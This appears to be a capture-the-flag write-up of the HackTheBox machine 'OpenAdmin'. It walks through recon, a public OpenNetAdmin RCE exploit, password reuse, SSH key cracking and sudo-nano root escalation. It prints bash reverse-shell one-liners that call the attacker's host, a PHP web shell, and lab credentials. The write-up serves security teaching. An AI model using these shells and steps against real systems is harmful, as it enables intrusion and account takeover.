---
title: "OpenAdmin - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## OpenAdmin
![](https://kar0nx.github.io/assets/images/writeup/5b00db157dbbd7099ff6c0ef10f910ea.png)
## Reconnaissance

IP: 10.10.10.171
## NMAP

```
nmap -T4 -p- -A 10.10.10.171
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 08:23 UTC
Nmap scan report for 10.10.10.171
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/29%OT=22%CT=1%CU=43652%PV=Y%DS=2%DC=T%G=Y%TM=68B163B
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=2%ISR=10C%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FA%GC
OS:D=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M55
OS:2NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=7120%W2=7120%
OS:W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M552NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40
OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   29.56 ms 10.10.14.1
2   30.39 ms 10.10.10.171

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.46 seconds
```

SSH and HTTP. So we need to find sth on website

## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829102439.png)

default apache page, so I used ffuf to directory fuzzing :

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.171/FUZZ
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829102831.png)

And I found 3 directories
/music

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829102557.png)

after clicking on login we are redirected to /ona

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829102751.png)

/artwork , nothing special here

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829102607.png)

/sierra , also nothing special here

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829102814.png)

back to /ona which is the best place to start cause we automatically log in with guest account and we got version ONA v18.1.1. 
Searching for exploits I found RCE:
https://www.exploit-db.com/exploits/47691
Tried this exploit and I got shell

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829103410.png)

gaining reverse shell with bash oneliner

```
bash -c 'bash -i >%26 /dev/tcp/10.10.14.8/4444 0>%261'
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829103638.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829103627.png)

then I searched for db location and I found that OpenNetAdmin have database located in 
/opt/ona/www/local/config/database_settings.inc.php

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829105732.png)

Reading database settings I found credentials

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829105811.png)

ona_sys   n1nj4W4rri0R!
Tried to connect via mysql but nothing happend, so tried switching user (password reused) which was successful with jimmy

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829110214.png)

## Gaining Access

Linpeas found 2 localhosts

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829110642.png)

and PHP exec extensions

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829110745.png)

we see that some site is hosting on port 52846 as joanna. Let's make port forward and check for it.

```
ssh -L 52846:localhost:52846 jimmy@10.10.10.171
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829111106.png)

Now navigating to localhost on port 52846 we see login panel

```
http://localhost:52846/
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829111324.png)

Easiest way to escalate to joanna is to add webshell to hosting location /var/www/internal

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829111834.png)

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829111803.png)

and now just use bash one liner like before for reverse shell:

```
http://localhost:52846/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.8/4444%200%3E%261%27
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829111944.png)

We got it and can take user.txt

## Privilege Escalation

From before use of linpeas we know that joanna have sudo priv with nano, but cant confirm it.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

tried to upgrade tty shell but didn't work for me, so lets copy joanna id_rsa

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829112500.png)

crack passphase with ssh2john 
bloodninjas

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829112751.png)

and now we can connect via ssh 

```
ssh -i id_rsa joanna@10.10.10.171
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829112835.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829113343.png)

Now I confirm that joanna have sudo rights with /bin/nano. Running commands from gtfobins we go root shell in nano, and we are able to take root flag.

https://gtfobins.github.io/gtfobins/nano/#sudo

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829113147.png)